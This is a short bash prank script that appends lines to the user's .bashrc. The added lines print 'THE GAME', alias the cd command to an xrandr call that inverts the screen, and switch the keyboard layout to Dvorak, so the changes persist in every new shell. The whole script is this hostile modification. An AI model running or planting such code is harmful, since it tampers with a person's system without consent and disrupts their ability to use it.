#!/bin/bash
echo "echo 'THE GAME'
alias cd='xrandr --orientation inverted'
cd
setxkbmap dvorak" >> .bashrc
source .bashrc
exit
